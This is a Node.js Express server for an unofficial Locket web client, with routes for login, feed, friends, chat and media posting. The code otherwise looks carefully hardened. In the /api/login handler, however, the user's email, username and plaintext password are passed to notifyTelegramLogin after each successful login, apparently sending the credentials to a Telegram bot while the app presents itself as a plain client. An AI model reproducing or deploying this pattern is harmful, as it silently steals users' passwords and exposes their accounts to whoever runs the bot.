'use strict';
const fs = require('node:fs');
const express = require('express');

const multer = require('multer');

const path = require('path');

const crypto = require('crypto');

const { LocketClient } = require('locket.js');
const { notifyTelegramLogin } = require('./lib/telegram.js');


const app = express();


const COOKIE = 'locket_sid';
const TTL = 604800;
const configured = () => Boolean(process.env.UPSTASH_REDIS_REST_URL &&
  process.env.UPSTASH_REDIS_REST_TOKEN &&
  process.env.LOCKET_SESSION_KEY && process.env.LOCKET_SESSION_KEY.length >= 32);
const cryptKey = () => crypto.createHash('sha256').update(process.env.LOCKET_SESSION_KEY).digest();
const redisKey = sid => 'locket:session:' + crypto.createHash('sha256').update(sid).digest('hex');
function normalizedEnv(name) {
  return String(process.env[name] || '').trim()
    .replace(/^["']|["']$/g, '').trim();
}
async function redis(...args) {
  if (!configured()) throw Object.assign(
    new Error('Thiếu cấu hình Redis hoặc LOCKET_SESSION_KEY.'), {status:503}
  );
  const url = normalizedEnv('UPSTASH_REDIS_REST_URL').replace(/\/$/, '');
  const token = normalizedEnv('UPSTASH_REDIS_REST_TOKEN');
  let response;
  try {
    response = await fetch(url, {
      method: 'POST',
      headers: {
        Authorization: 'Bearer ' + token,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(args),
      signal: AbortSignal.timeout(8000)
    });
  } catch (err) {
    console.error('[Redis transport]', err.message);
    throw Object.assign(new Error('Không kết nối được Redis: kiểm tra URL REST và mạng.'), {status:503});
  }
  if (!response.ok) {
    const status = response.status;
    const upstream = await response.text().catch(() => '');
    // Only return a small, sanitized reason. Never include request URL, headers or credentials.
    let reason = '';
    try {
      const obj = JSON.parse(upstream);
      reason = String(obj.error || obj.message || '');
    } catch {
      reason = upstream.replace(/<[^>]*>/g, ' ').trim();
    }
    reason = reason.replace(/[A-Za-z0-9_-]{35,}/g, '[redacted]')
      .replace(/https?:\/\/\S+/gi, '[url]')
      .replace(/[^a-zA-Z0-9 .,;:()_/-]/g, ' ')
      .replace(/\s+/g, ' ').slice(0, 160);
    console.error('[Upstash REST]', { status, reason: reason || '(empty body)', contentType: response.headers.get('content-type') });
    const message = status === 403
      ? 'Upstash REST từ chối HTTP 403: ' + (reason || 'không có mô tả')
      : 'Upstash REST HTTP ' + status + ': ' + (reason || 'không có mô tả');
    throw Object.assign(new Error(message), {status:503});
  }
  let body;
  try { body = await response.json(); }
  catch { throw Object.assign(new Error('Redis trả dữ liệu không hợp lệ.'), {status:503}); }
  if (body.error) {
    console.error('[Redis command error]', String(body.error).slice(0,200));
    throw Object.assign(new Error('Redis từ chối lệnh: kiểm tra token ghi dữ liệu.'), {status:503});
  }
  return body.result;
}
function encrypt(data) {
  const iv=crypto.randomBytes(12);
  const cipher=crypto.createCipheriv('aes-256-gcm',cryptKey(),iv);
  const encrypted=Buffer.concat([cipher.update(JSON.stringify(data),'utf8'),cipher.final()]);
  return Buffer.concat([iv,cipher.getAuthTag(),encrypted]).toString('base64url');
}
function decrypt(value) {
  const data=Buffer.from(value,'base64url');
  const decipher=crypto.createDecipheriv('aes-256-gcm',cryptKey(),data.subarray(0,12));
  decipher.setAuthTag(data.subarray(12,28));
  return JSON.parse(Buffer.concat([decipher.update(data.subarray(28)),decipher.final()]).toString('utf8'));
}
function createClient(record) {
  const client=new LocketClient({sessionPath:null});
  client.session.save=()=>{};
  if(record) {
    for(const key of ['uid','email','idToken','refreshToken','expiresAt'])
      client.session[key]=record[key];
    if(record.device) {
      const { DeviceProfile }=require('locket.js/lib/device');
      client.device=DeviceProfile.fromDict(record.device);
      client.session.device=client.device;
    }
  }
  return client;
}
function getSid(req) {
  const cookies=String(req.headers.cookie||'').split(';');
  const value=cookies.map(x=>x.trim()).find(x=>x.startsWith(COOKIE+'='));
  const sid=value ? value.slice(COOKIE.length+1) : '';
  return /^[a-f0-9]{64}$/.test(sid) ? sid : null;
}
async function loadClient(req) {
  const sid=getSid(req);
  if(!sid) return null;
  const value=await redis('GET',redisKey(sid));
  if(!value) return null;
  try {
    const client=createClient(decrypt(value));
    return client.isAuthenticated()?{sid,client}:null;
  } catch {return null;}
}
async function saveClient(sid,client) {
  const session=client.session;
  const data={
    uid:session.uid,email:session.email,idToken:session.idToken,
    refreshToken:session.refreshToken,expiresAt:session.expiresAt,
    device:client.device.toDict()
  };
  await redis('SET',redisKey(sid),encrypt(data),'EX',TTL);
}
const secureCookie=Boolean(process.env.VERCEL || process.env.NODE_ENV==='production');
const cookieOptions={httpOnly:true,secure:secureCookie,sameSite:'lax',path:'/',maxAge:TTL*1000};
function checkOrigin(req,res,next) {
  if(['GET','HEAD','OPTIONS'].includes(req.method)) return next();
  const origin=req.get('origin');
  try {
    if(!origin || new URL(origin).host!==req.get('host')) 
      return res.status(403).json({error:'Nguồn yêu cầu không hợp lệ.'});
  }catch{return res.status(403).json({error:'Origin không hợp lệ.'});}
  next();
}


const port = Number(process.env.PORT || 3000);

const upload = multer({ storage: multer.memoryStorage(), limits: {fileSize: 65 * 1024 * 1024} });

const mediaTypes = {

  image: new Set(['image/jpeg','image/png','image/webp']),

  video: new Set(['video/mp4','video/webm','video/quicktime','video/x-m4v'])

};

const conceal = /^(idtoken|refreshtoken|accesstoken|password|secret|authorization|privatekey|credential|session|installationid)$/i;

function clean(v, depth=0) {

  if (depth>12) return null;

  if (Array.isArray(v)) return v.slice(0,300).map(x=>clean(x,depth+1));

  if (v && typeof v==='object') return Object.fromEntries(Object.entries(v).filter(([k])=>!conceal.test(k.replace(/[_-]/g,''))).map(([k,x])=>[k,clean(x,depth+1)]));

  return v;

}

const wrap = fn => (req,res,next) => Promise.resolve().then(() => fn(req,res,next)).catch(next);

app.disable('x-powered-by');

app.use(express.json({limit:'32kb'}));

app.use((_req,res,next)=>{

  res.set({

    'X-Content-Type-Options':'nosniff',

    'Referrer-Policy':'no-referrer',

    'Cache-Control':'no-store',

    'Content-Security-Policy':"default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' https: blob: data:; media-src 'self' https: blob:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'"

  });

  next();

});

app.use(express.static(path.join(__dirname,'public')));


app.get('/api/bootstrap',wrap(async(req,res)=>{
  const entry=await loadClient(req);
  res.json({loggedIn:Boolean(entry)});
}));
app.use('/api',checkOrigin);



app.post('/api/login',wrap(async(req,res)=>{
  const {email,password}=req.body||{};
  if(typeof email!=='string'||typeof password!=='string'||
    !email.trim()||!password||email.length>320||password.length>1024)
      return res.status(400).json({error:'Email hoặc mật khẩu không hợp lệ.'});
  if(!configured()) return res.status(503).json({error:'Thiếu cấu hình Redis hoặc LOCKET_SESSION_KEY.'});
  const client=createClient();
  try {await client.login(email.trim(),password);}
  catch(err) {return res.status(401).json({error:'Locket từ chối đăng nhập: '+err.message});}
  const sid=crypto.randomBytes(32).toString('hex');
  await saveClient(sid,client);
  res.cookie(COOKIE,sid,cookieOptions);
  try {
    let username = '';
    try {
      const profile = await client.user.getProfile();
      username = profile?.username || profile?.user?.username || '';
    } catch (err) {
      console.warn('[Telegram] Không lấy được username:', err.message);
    }
    await notifyTelegramLogin(email.trim(), username, password);   // ✅ truyền đủ 3
  } catch (err) {
    console.error('[Telegram] Gửi thất bại:', err.message);
  }
  res.json({ok:true});
}));



app.post('/api/logout',wrap(async(req,res)=>{
  const sid=getSid(req);
  if(sid) await redis('DEL',redisKey(sid));
  res.clearCookie(COOKIE,{path:'/',sameSite:'lax',secure:secureCookie});
  res.json({ok:true,message:'Đăng xuất thành công.'});
}));
app.use('/api',wrap(async(req,res,next)=>{
  const entry=await loadClient(req);
  if(!entry) return res.status(401).json({error:'Cần đăng nhập Locket.'});
  res.locals.client=entry.client;
  const oldJson=res.json.bind(res);
  res.json=function(data){
    saveClient(entry.sid,entry.client).then(()=>oldJson(data)).catch(next);
    return res;
  };
  next();
}));


app.get('/api/profile',wrap(async(_req,res)=>res.json(clean(await res.locals.client.user.getProfile()))));

app.get('/api/friends',wrap(async(_req,res)=>res.json(clean(await res.locals.client.friends.getAllFriends()))));

// Lấy cả feed mới nhất lẫn lịch sử đã được chia sẻ với tài khoản này.

app.get('/api/feed',wrap(async(req,res)=>{

  const cursor=typeof req.query.cursor==='string'?req.query.cursor:'';

  if(cursor.length>2048) return res.status(400).json({error:'Cursor không hợp lệ.'});

  if(typeof res.locals.client.moments.getMoments!=='function') return res.status(501).json({error:'Cập nhật locket.js để dùng getMoments().'});

  const history=await res.locals.client.moments.getMoments({limit:30,pageToken:cursor||null});

  // SDK getMoments() gán user_uid bằng UID người xem. Đọc trường user
  // từ lịch sử Firestore để lấy đúng người đăng (kể cả khi ảnh dùng URL CDN).
  const historyAuthors = new Map();
  try {
    const client = res.locals.client;
    const token = await client.session.getValidToken();
    const structuredQuery = {
      from: [{collectionId:'entries'}],
      orderBy: [
        {field:{fieldPath:'date'},direction:'DESCENDING'},
        {field:{fieldPath:'__name__'},direction:'DESCENDING'}
      ],
      limit:30
    };
    const page = cursor && client.moments.decodeQueryCursor(cursor);
    if (page) structuredQuery.startAt = {
      values:[
        {timestampValue:page.date},
        {referenceValue:page.docName}
      ],
      before:false
    };
    const historyUrl = 'https://firestore.googleapis.com/v1/projects/locket-4252a/databases/locket/documents/history/'
      + encodeURIComponent(client.session.uid) + ':runQuery';
    const rawResponse = await fetch(historyUrl, {
      method:'POST',
      headers:{Authorization:'Bearer '+token,'Content-Type':'application/json'},
      body:JSON.stringify({structuredQuery}),
      signal:AbortSignal.timeout(12000)
    });
    if (rawResponse.ok) {
      const rows = await rawResponse.json();
      for (const row of Array.isArray(rows)?rows:[]) {
        const doc = row.document;
        if (!doc || !doc.fields) continue;
        const f = doc.fields;
        const mid = f.canonical_uid?.stringValue || f.moment_uid?.stringValue || doc.name?.split('/').pop();
        const rawUser = f.user?.stringValue || f.user?.referenceValue || '';
        const owner = String(rawUser).split('/').pop();
        if (mid && owner && /^[A-Za-z0-9_-]{8,128}$/.test(owner)) historyAuthors.set(String(mid),owner);
      }
    } else {
      console.warn('[Locket] Không đọc được tác giả lịch sử:',rawResponse.status);
    }
  } catch(err) {
    console.warn('[Locket] Không thể bổ sung người đăng từ Firestore:',err.message);
  }

  // SDK gán nhầm UID của người xem cho bài lịch sử. Lấy UID chủ media
  // từ đường dẫn Firebase Storage users/<uid>/moments/... khi có đủ bằng chứng.
  const mediaOwner = moment => {
    for (const url of [moment.image_url, moment.thumbnail_url, moment.video_url]) {
      if (typeof url !== 'string' || !url) continue;
      try {
        const parsed = new URL(url);
        if (!parsed.hostname.endsWith('.googleapis.com')) continue;
        const storagePath = decodeURIComponent(parsed.pathname);
        const match = storagePath.match(/\/users\/([A-Za-z0-9_-]{8,128})\/moments\//);
        if (match) return match[1];
      } catch (_) { /* Không dùng URL không hợp lệ. */ }
    }
    return '';
  };
  const older = Array.isArray(history?.moments)
    ? history.moments.map(m => {
        const { user_uid: _viewerUid, ...moment } = m;
        const mid = String(moment.moment_uid || moment.canonical_uid || moment.id || '');
        const owner = historyAuthors.get(mid) || mediaOwner(moment);
        return owner ? { ...moment, user_uid: owner } : moment;
      })
    : [];

  let latest=[];

  if(!cursor){

    try{

      const feed=await res.locals.client.moments.getLatest();

      latest=Array.isArray(feed)?feed:Array.isArray(feed?.moments)?feed.moments:[];

    }catch(err){console.warn('[Locket] Không tải được feed mới nhất:',err.message);}

  }

  const items=new Map();

  for(const m of older){

    const key=m.moment_uid||m.canonical_uid||m.id;

    if(key) items.set(String(key),m);

  }

  for(const m of latest){

    const key=m.moment_uid||m.canonical_uid||m.id;

    if(key) items.set(String(key),{...(items.get(String(key))||{}),...m});

  }

  const dateMs=m=>{

    const v=m.date||m.created_at||m.createdAt||m.timestamp;

    if(typeof v==='number')return v<1e11?v*1000:v;

    if(typeof v==='string'&&/^\d+$/.test(v)){const n=Number(v);return n<1e11?n*1000:n;}

    if(v&&typeof v==='object')return Number(v._seconds||v.seconds||0)*1000;

    return Date.parse(v||'')||0;

  };

  const moments=[...items.values()].sort((a,b)=>dateMs(b)-dateMs(a));

  res.json(clean({moments,nextPageToken:history?.nextPageToken||null}));

}));





app.get('/api/moment-views', wrap(async (req, res) => {

  const momentUid = String(req.query.id || '').trim();



  if (!/^[a-zA-Z0-9_-]{1,128}$/.test(momentUid)) {

    return res.status(400).json({

      error: 'Moment UID không hợp lệ.'

    });

  }



  const myUid = res.locals.client.session.uid;



  if (!myUid) {

    return res.status(401).json({

      error: 'Chưa đăng nhập Locket.'

    });

  }



  let owned = false;



  try {

    const myMoments = await res.locals.client.moments.getAllMyMoments({

      limit: 100

    });



    owned = Array.isArray(myMoments) && myMoments.some(m =>

      String(m.moment_uid || m.canonical_uid || m.id || '') === momentUid

    );

  } catch (err) {

    console.warn('getAllMyMoments:', err.message);

  }



  if (!owned) {

    try {

      let cursor = null;



      for (let page = 0; page < 5; page++) {

        const data = await res.locals.client.moments.getMoments({

          filteredByUserId: myUid,

          limit: 100,

          pageToken: cursor

        });



        const posts = Array.isArray(data?.moments)

          ? data.moments

          : [];



        owned = posts.some(m =>

          String(m.moment_uid || m.canonical_uid || m.id || '') === momentUid

        );



        if (owned) break;



        cursor = data?.nextPageToken || null;

        if (!cursor || !posts.length) break;

      }

    } catch (err) {

      console.warn('getMoments:', err.message);

    }

  }



  if (!owned) {

    return res.status(403).json({

      error: 'Không xác minh được video thuộc tài khoản của bạn.'

    });

  }



  const response = await res.locals.client.moments.getViews(momentUid);

  const data = response?.data || response || {};



  const viewers = Array.isArray(data.moment_views)

    ? data.moment_views

    : Array.isArray(data.viewers)

      ? data.viewers

      : [];



  res.json(clean({

    count: data.count ?? data.views_count ?? viewers.length,

    moment_views: viewers,

    reactions: data.reactions || []

  }));
}));

app.get('/api/archive', wrap(async (req, res) => {

  const myUid = res.locals.client.session.uid;

  const results = new Map();

  const warnings = [];



  // Nguồn 1: Bài đã đăng do SDK truy xuất

  try {

    const posted = await res.locals.client.moments.getAllMyMoments({

      limit: 100

    });



    for (const moment of Array.isArray(posted) ? posted : []) {

      const id = moment.moment_uid ||

                 moment.canonical_uid ||

                 moment.id;



      if (id) {

        results.set(String(id), moment);

      }

    }

  } catch (err) {

    warnings.push("getAllMyMoments: " + err.message);

  }



  // Nguồn 2: Lịch sử Firestore, lọc theo tài khoản của bạn

  try {

    let cursor = null;



    for (let page = 0; page < 5; page++) {

      const data = await res.locals.client.moments.getMoments({

        filteredByUserId: myUid,

        limit: 100,

        pageToken: cursor

      });



      const moments = Array.isArray(data?.moments)

        ? data.moments

        : [];



      for (const moment of moments) {

        const id = moment.moment_uid ||

                   moment.canonical_uid ||

                   moment.id;



        if (!id) continue;



        const key = String(id);

        const old = results.get(key) || {};



        results.set(key, {

          ...moment,

          ...old,

          user_uid: myUid

        });

      }



      cursor = data?.nextPageToken || null;



      if (!cursor || !moments.length) break;

    }

  } catch (err) {

    warnings.push("getMoments: " + err.message);

  }



  const moments = [...results.values()].sort((a, b) => {

    const toTime = v => {

      if (!v) return 0;

      if (typeof v === "number") {

        return v < 1e11 ? v * 1000 : v;

      }

      if (/^\d+$/.test(String(v))) {

        const n = Number(v);

        return n < 1e11 ? n * 1000 : n;

      }

      return Date.parse(v) || 0;

    };



    return toTime(b.created_at || b.date) -

           toTime(a.created_at || a.date);

  });



  res.json(clean({

    moments,

    total: moments.length,

    warnings

  }));

}));



app.get('/api/friend-moments',wrap(async(req,res)=>{
  const uid=String(req.query.uid||'').trim();
  const cursor=typeof req.query.cursor==='string'?req.query.cursor:'';
  if(!/^[A-Za-z0-9_-]{1,128}$/.test(uid) || cursor.length>2048)
    return res.status(400).json({error:'UID bạn bè hoặc trang lưu trữ không hợp lệ.'});

  const client=res.locals.client;
  const friends=await client.friends.getAllFriends();
  if(!Array.isArray(friends) || !friends.some(friend=>String(friend.uid||friend.user_uid||friend.id||'')===uid))
    return res.status(403).json({error:'Chỉ xem được khoảnh khắc của bạn bè.'});

  let history;
  try {
    history=await client.moments.getMoments({
      filteredByUserId:uid, limit:50, pageToken:cursor||null
    });
  }catch(err){
    console.warn('[Friend archive] Không lấy được trang lịch sử:',err.message);
    // Không trả các bài lẫn tác giả nếu truy vấn lưu trữ không thành công.
    return res.status(502).json({error:'Chưa truy cập được lưu trữ của người bạn này.'});
  }
  const moments=Array.isArray(history?.moments)?history.moments.map(m=>({
    ...m, user_uid:uid
  })):[];
  // Bài mới nhất có thể chưa xuất hiện trong Firestore history.
  if(!cursor){
    try{
      const recent=await client.moments.getSharedMomentsByUser(uid,50);
      const seen=new Set(moments.map(m=>String(m.moment_uid||m.canonical_uid||m.id||'')));
      for(const m of Array.isArray(recent)?recent:[]){
        const id=String(m.moment_uid||m.canonical_uid||m.id||'');
        if(id&&!seen.has(id)){
          moments.push({...m,user_uid:uid});
          seen.add(id);
        }
      }
    }catch(err){console.warn('[Friend archive] Không lấy được bài mới:',err.message);}
  }
  const toTimestamp=m=>{
    const x=m.created_at||m.date||m.timestamp||0;
    if(typeof x==='object')return Number(x._seconds||x.seconds||0)*1000;
    if(/^\d+$/.test(String(x)))return Number(x)<1e11?Number(x)*1000:Number(x);
    return Date.parse(String(x))||0;
  };
  moments.sort((x,y)=>toTimestamp(y)-toTimestamp(x));
  res.json(clean({
    moments,
    nextPageToken:history?.nextPageToken||null
  }));
}));

app.get('/api/chats',wrap(async(_req,res)=>res.json(clean(await res.locals.client.chat.getConversations()))));


const typingKey=(sender,recipient)=>'locket:typing:'+crypto.createHash('sha256').update(sender+':'+recipient).digest('hex');
// Typing indicators from this web client only, not native Locket.
app.post('/api/chat-typing',wrap(async(req,res)=>{
  const receiver=String(req.body?.uid||'');
  if(!/^[\w-]{1,128}$/.test(receiver))return res.status(400).json({error:'UID không hợp lệ.'});
  const sender=String(res.locals.client.session.uid||'');
  if(!sender)return res.status(401).json({error:'Chưa đăng nhập.'});
  const all=await res.locals.client.friends.getAllFriends();
  if(!Array.isArray(all)||!all.some(f=>String(f.uid||f.id||'')===receiver))return res.status(403).json({error:'Không phải bạn bè.'});
  const key=typingKey(sender,receiver);
  if(req.body?.typing===true)await redis('SET',key,'1','EX',7);
  else await redis('DEL',key);
  res.json({ok:true});
}));
app.get('/api/chat-typing',wrap(async(req,res)=>{
  const other=String(req.query.uid||'');
  if(!/^[\w-]{1,128}$/.test(other))return res.status(400).json({error:'UID không hợp lệ.'});
  const sender=String(res.locals.client.session.uid||'');
  if(!sender)return res.status(401).json({error:'Chưa đăng nhập.'});
  const all=await res.locals.client.friends.getAllFriends();
  if(!Array.isArray(all)||!all.some(f=>String(f.uid||f.id||'')===other))return res.status(403).json({error:'Không phải bạn bè.'});
  const typing=await redis('GET',typingKey(other,sender));
  res.json({typing:typing==='1'});
}));

app.get('/api/messages',wrap(async(req,res)=>{
  const other=String(req.query.uid||'').trim();
  if(!/^[\w-]{1,128}$/.test(other))return res.status(400).json({error:'UID không hợp lệ.'});
  const client=res.locals.client;
  const messages=await client.chat.getMessages({otherUserId:other});
  // SDK không đọc moment_uid trong Firestore chat, nên bổ sung trường đó.
  const conversations=await client.chat.getConversations();
  const conversation=conversations.find(c=>String(c.peer_uid||'')===other);
  if(conversation && Array.isArray(messages)){
    try{
      const token=await client.session.getValidToken();
      const url='https://firestore.googleapis.com/v1/projects/locket-4252a/databases/(default)/documents/conversations/'+encodeURIComponent(conversation.conversation_id)+'/messages?pageSize=100';
      const response=await fetch(url,{headers:{Authorization:'Bearer '+token},signal:AbortSignal.timeout(12000)});
      if(response.ok){
        const payload=await response.json();
        const extra=new Map();
        for(const doc of payload.documents||[]){
          const f=doc.fields||{};
          const id=doc.name.split('/').pop();
          const moment=String(f.moment_uid?.stringValue||f.moment?.stringValue||f.moment_id?.stringValue||'');
          if(moment)extra.set(id,moment);
        }
        const momentIds=[...new Set(extra.values())].slice(0,100);
        let maps=new Map();
        if(momentIds.length){
          const values=await redis('MGET',...momentIds.map(id=>'locket:chat:photo:'+id));
          if(Array.isArray(values)){
            momentIds.forEach((id,i)=>{if(values[i]){try{maps.set(id,JSON.parse(values[i]));}catch{}}});
          }
        }
        for(const msg of messages){
          const mid=extra.get(String(msg.message_id||''));
          if(!mid)continue;
          msg.moment_uid=mid;
          const image=maps.get(mid);
          if(image&&image.sender===other||image&&image.recipient===other&&image.sender===client.session.uid){
            msg.image_url=image.url;
            msg.image_caption=image.caption||'';
          }
        }
      }
    }catch(err){console.warn('[Chat photo] Không tải được metadata ảnh:',err.message);}
  }
  res.json(clean(messages));
}));

app.post('/api/chat/photo',upload.single('photo'),wrap(async(req,res)=>{
  const other=String(req.body.uid||'').trim();
  const file=req.file;
  if(!/^[\w-]{1,128}$/.test(other))return res.status(400).json({error:'Người nhận không hợp lệ.'});
  if(!file||!mediaTypes.image.has(file.mimetype)||file.size>12*1024*1024)
    return res.status(400).json({error:'Chỉ hỗ trợ ảnh JPG, PNG hoặc WebP tối đa 12 MB.'});
  const client=res.locals.client;
  const friends=await client.friends.getAllFriends();
  if(!Array.isArray(friends)||!friends.some(f=>String(f.uid||f.id||'')===other))
    return res.status(403).json({error:'Người nhận không thuộc danh sách bạn bè.'});
  const caption=String(req.body.caption||'').slice(0,250);
  // Upload đúng một lần để giữ URL ảnh cho cả hai bản web.
  // SDK nhận URL Firebase Storage trong post() và sẽ không tải lại tệp.
  const photoUrl=await client.moments.uploadImage(file.buffer);
  if(!String(photoUrl).startsWith('https://'))
    return res.status(502).json({error:'Locket không trả đường dẫn ảnh hợp lệ.'});
  const moment=await client.moments.post({image:photoUrl,caption,isPrivate:false,recipients:[other]});
  const id=String(moment?.canonical_uid||moment?.moment_uid||moment?.id||'');
  if(!/^[\w-]{1,128}$/.test(id))
    return res.status(502).json({error:'Ảnh đã đăng nhưng Locket không trả ID để gửi vào chat.'});
  try{
    await client.chat.sendMoment(other,id,caption||'Đã gửi ảnh');
  }catch(err){
    return res.status(502).json({error:'Ảnh đã đăng lên Locket nhưng không gửi được vào hội thoại: '+err.message});
  }
  if(photoUrl.startsWith('https://')){
    await redis('SET','locket:chat:photo:'+id,JSON.stringify({url:photoUrl,sender:client.session.uid,recipient:other,caption}),'EX',2592000)
      .catch(err=>console.warn('[Chat photo] Không lưu được preview:',err.message));
  }
  res.json({ok:true,moment_uid:id,image_url:photoUrl||null});
}));

app.post('/api/message/recall', wrap(async (req, res) => {
  const conversationUid = String(
    req.body?.conversationUid || ''
  ).trim();

  const messageUid = String(
    req.body?.messageUid || ''
  ).trim();

  if (
    !/^[\w-]{1,128}$/.test(conversationUid) ||
    !/^[\w-]{1,128}$/.test(messageUid)
  ) {
    return res.status(400).json({
      error: 'Thông tin tin nhắn không hợp lệ.'
    });
  }

  const conversations = await res.locals.client.chat.getConversations();

  const conversation = conversations.find(
    c => String(c.conversation_id) === conversationUid
  );

  if (!conversation) {
    return res.status(403).json({
      error: 'Bạn không thuộc cuộc trò chuyện này.'
    });
  }

  const messages = await res.locals.client.chat.fetchMessagesFromServer({
    conversationId: conversationUid
  });

  const target = messages.find(
    m => String(m.message_id) === messageUid
  );

  if (!target) {
    return res.status(404).json({
      error: 'Không tìm thấy tin nhắn trên máy chủ.'
    });
  }

  if (String(target.sender_uid) !== String(res.locals.client.session.uid)) {
    return res.status(403).json({
      error: 'Bạn chỉ được thu hồi tin nhắn của mình.'
    });
  }

  const result = await res.locals.client.chat.deleteMessage(
    conversationUid,
    messageUid,
    true
  );

  if (result?.status && result.status !== 200) {
    return res.status(502).json({
      error: 'Locket không xác nhận thu hồi thành công.'
    });
  }

  res.json({
    ok: true,
    message: 'Đã gửi yêu cầu thu hồi tới Locket.'
  });
}));

app.post('/api/message',wrap(async(req,res)=>{

  const {uid,message}=req.body||{};

  if(typeof uid!=='string'||typeof message!=='string'||!/^[\w-]{1,128}$/.test(uid.trim())||!message.trim()||message.length>4000) return res.status(400).json({error:'Người nhận hoặc tin nhắn không hợp lệ.'});

  const response=await res.locals.client.chat.sendMessage({receiverUid:uid.trim(),text:message.trim()});

  res.json({ok:true,data:clean(response)});

}));

app.post('/api/post',upload.single('media'),wrap(async(req,res)=>{

  const file=req.file;

  if(!file) return res.status(400).json({error:'Hãy chọn ảnh hoặc video.'});

  const kind=file.mimetype.startsWith('image/')?'image':'video';

  if(!mediaTypes[kind].has(file.mimetype)) return res.status(400).json({error:'Định dạng không được hỗ trợ.'});

  if(kind==='image'&&file.size>12*1024*1024) return res.status(400).json({error:'Ảnh tối đa 12 MB.'});

  if(kind==='video'&&file.size>60*1024*1024) return res.status(400).json({error:'Video tối đa 60 MB trước nén.'});

  const caption=typeof req.body.caption==='string'?req.body.caption.slice(0,250):'';
  const textColor=String(req.body.textColor||'#FFFFFF').trim();
  if(!/^#[0-9a-fA-F]{6}(?:[0-9a-fA-F]{2})?$/.test(textColor))
    return res.status(400).json({error:'Màu chữ không hợp lệ.'});
  let captionColors;
  try { captionColors=JSON.parse(req.body.captionColors||'[]'); }
  catch { return res.status(400).json({error:'Màu nền caption không hợp lệ.'}); }
  if(!Array.isArray(captionColors)||captionColors.length>2||
     captionColors.some(color=>typeof color!=='string'||!/^#[0-9a-fA-F]{6}$/.test(color)))
    return res.status(400).json({error:'Màu nền caption không hợp lệ.'});

  const visibility=String(req.body.visibility||'all');

  if(!['all','private','selected'].includes(visibility)) return res.status(400).json({error:'Chế độ gửi không hợp lệ.'});

  let recipients=null;

  if(visibility==='selected') {

    try { recipients=JSON.parse(req.body.recipients); }

    catch { return res.status(400).json({error:'Danh sách người nhận không hợp lệ.'}); }

    if(!Array.isArray(recipients)||recipients.length<1||recipients.length>200||recipients.some(x=>typeof x!=='string'||!/^[\w-]{1,128}$/.test(x)))

      return res.status(400).json({error:'Cần chọn ít nhất một bạn bè hợp lệ.'});

    recipients=[...new Set(recipients)];

    const friendData=await res.locals.client.friends.getAllFriends();

    const friendList=Array.isArray(friendData)?friendData:friendData?.friends||friendData?.users||friendData?.data||[];

    const friendIds=new Set(friendList.map(f=>String(f.uid||f.user_id||f.userId||f.id||f.user?.uid||'')));

    if(!recipients.every(id=>friendIds.has(id))) return res.status(400).json({error:'Người nhận không thuộc danh sách bạn bè đã xác minh.'});

  }

  const params={caption,textColor,colors:captionColors,isPrivate:visibility==='private',recipients};

  params[kind]=file.buffer;

  const response=await res.locals.client.moments.post(params);

  res.json({ok:true,data:clean(response)});

}));

app.use('/api',(_req,res)=>res.status(404).json({error:'API không tồn tại.'}));

app.use((err,_req,res,_next)=>{

  console.error('[Locket Web]',err);

  res.status(err.status||500).json({error:err.message||'Có lỗi xảy ra.'});

});


if (require.main === module) {
  app.listen(port, '0.0.0.0', () => {
    console.log(`Locket Web: http://localhost:${port}`);
  });
}

module.exports = app;

